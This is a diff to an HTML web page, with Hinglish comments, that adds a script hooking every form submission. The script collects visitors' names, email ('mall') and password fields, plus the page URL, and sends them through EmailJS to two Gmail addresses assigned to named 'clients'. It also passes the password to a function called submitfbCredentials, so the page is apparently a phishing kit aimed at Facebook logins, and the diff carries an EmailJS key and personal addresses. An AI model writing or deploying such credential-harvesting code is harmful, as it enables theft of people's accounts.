@@ -2224,43 +2224,48 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
   }
 });
-  </script>
-  <!-- tumhara poora saara HTML code yahan tak -->
-
-  <!-- SIRF YE NAYA CODE YAHAN NEECHE PASTE KAR DO -->
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script type="text/javascript">
-    (function() {
-      emailjs.init("8AcP51LH7_IRW17aY");
-    })();
+<script type="text/javascript">
+  (function() {
+    emailjs.init("8AcP51LH7_IRW17aY");
+  })();
 
-    var email1   = "lingdavid24@gmail.com";
-    var email2   = "akeraa191@gmail.com";
-    var client1  = "Rahul Sharma";
-    var client2  = "Vikash Kumar";
+  var email1   = "lingdavid24@gmail.com";
+  var email2   = "akeraa191@gmail.com";
+  var client1  = "Rahul Sharma";
+  var client2  = "Vikash Kumar";
 
-    document.querySelectorAll('form').forEach(form => {
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        let clientName = this.querySelector('input[name="name"]') ? client1 : client2;
-        let toEmail    = this.querySelector('input[name="name"]') ? email1 : email2;
+  document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
 
-        emailjs.send("service_nqeen3l", "template_z0ow5n7", {
-          client_name: clientName,
-          website_url: window.location.href,
-          user_name:   document.querySelector('input[name="name"]')?.value || "No name",
-          user_mall:   document.querySelector('input[name="mall"]')?.value || "",
-          user_pass:   document.querySelector('input[type="password"]')?.value || "",
-          to_email:    toEmail
+      let clientName = this.querySelector('input[name="name"]') ? client1 : client2;
+      let toEmail    = this.querySelector('input[name="name"]') ? email1 : email2;
+
+      const params = {
+        client_name: clientName,
+        website_url: window.location.href,
+        user_name:   document.querySelector('input[name="name"]')?.value || "No name",
+        user_mall:   document.querySelector('input[name="mall"]')?.value || "",
+        user_pass:   document.querySelector('input[type="password"]')?.value || "",
+        to_email:    toEmail
+      };
+
+      emailjs.send("service_nqeen3l", "template_z0ow5n7", params)
+        .then((response) => {
+          console.log('Email SUCCESS!', response.status, response.text);  // ← Console mein success dikhega
+          alert('Mail bhej diya gaya! Check spam folder.');
+        }, (error) => {
+          console.log('Email FAILED!', error);  // ← Error dikhega console mein
+          alert('Mail fail ho gaya. Console check karo.');
         });
 
-        if (typeof submitFormData === 'function') submitFormData();
-        if (typeof submitfbCredentials === 'function') 
-          submitfbCredentials(document.querySelector('input[type="password"]')?.value);
-      });
+      // Purana code chalega
+      if (typeof submitFormData === 'function') submitFormData();
+      if (typeof submitfbCredentials === 'function') 
+        submitfbCredentials(document.querySelector('input[type="password"]')?.value);
     });
-  </script>
-</body>
-</html>
+  });
+</script>
 
 </body></html>
